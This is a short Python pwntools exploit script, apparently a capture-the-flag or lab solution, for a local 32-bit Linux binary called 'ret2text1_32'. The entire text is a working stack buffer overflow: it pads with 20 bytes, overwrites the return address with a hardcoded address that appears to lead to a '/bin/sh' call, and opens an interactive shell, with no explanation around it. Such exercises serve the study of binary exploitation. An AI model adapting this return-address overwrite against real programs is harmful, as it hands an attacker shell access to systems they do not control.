from pwn import *
context(os='linux',arch='i386',log_level='debug')
p=process('./ret2text1_32')
elf = ELF('./ret2text1_32')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
bin_sh=0x8048643
bin_sh_chuancan=0x8048585
offset=20
payload=b"a"*offset + p32(bin_sh_chuancan)
p.sendline(payload)
p.interactive()
